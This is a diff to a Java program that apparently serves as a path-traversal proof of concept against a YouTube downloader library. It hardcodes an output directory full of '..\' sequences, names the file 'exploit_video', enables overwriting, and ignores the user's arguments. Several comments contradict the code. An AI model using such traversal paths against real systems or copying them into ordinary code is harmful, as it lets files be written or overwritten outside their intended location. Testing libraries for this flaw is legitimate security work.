@@ -11,15 +11,23 @@ public class Main {
 
     public static void main(String[] args) {
 
+        // Updated usage instructions
+        if (args.length < 2) {
+            System.out.println("Usage: java -jar your_program.jar -videoId download_path");
+            return; // Exit if no URL or download path is provided
+        }
+
         // Initialize YoutubeDownloader
         YoutubeDownloader downloader = new YoutubeDownloader();
 
+        // The second argument is the videoID to download but it's not used
+        //String videoId = args[0]; //videoId is the first argument
 
-        // Specify the video ID to download
-        String videoId = "a7KLMOm_LYk";
+        // The second argument is the download path but it's not used in the path manipulation
+        // String outputDirPath = args[1];
 
         // Fetch video information
-        RequestVideoInfo requestVideoInfo = new RequestVideoInfo(videoId);
+        RequestVideoInfo requestVideoInfo = new RequestVideoInfo("U96PGrgf8IQ");
         Response<VideoInfo> responseVideoInfo = downloader.getVideoInfo(requestVideoInfo);
 
         if (responseVideoInfo.ok()) {
@@ -28,14 +36,13 @@ public class Main {
             // Assuming we take the first available format (for simplicity)
             Format format = videoInfo.videoFormats().get(0);
 
-            // Set up the output directory and file name, intentionally using path traversal sequences
-            File outputDir = new File("my_videos\\..\\..\\..\\TestDir");  // Attempt to navigate to a directory outside 'my_videos'
+            // The manipulated output directory remains unchanged, ignoring the input "outputDir"
+            File outputDir = new File("my_videos\\..\\..\\..\\..\\..\\..\\TestDir");
 
             RequestVideoFileDownload request = new RequestVideoFileDownload(format)
-                    .saveTo(outputDir)  // Set the manipulated output directory
-                    .renameTo("..\\..\\..\\TestDir\\exploit_video")  // Attempt to further manipulate the path
-                    .overwriteIfExists(true)
-                    ;  // Overwrite any existing file
+                    .saveTo(outputDir)// Continue using the hardcoded manipulated output directory
+                    .renameTo("exploit_video")  // Attempt to further manipulate the path
+                    .overwriteIfExists(true);
 
             // Execute the download request
             Response<File> response = downloader.downloadVideoFile(request);
@@ -50,5 +57,10 @@ public class Main {
             System.out.println("Failed to fetch video info: " + responseVideoInfo.error().getMessage());
         }
     }
+
+
+
+
+
 
 }
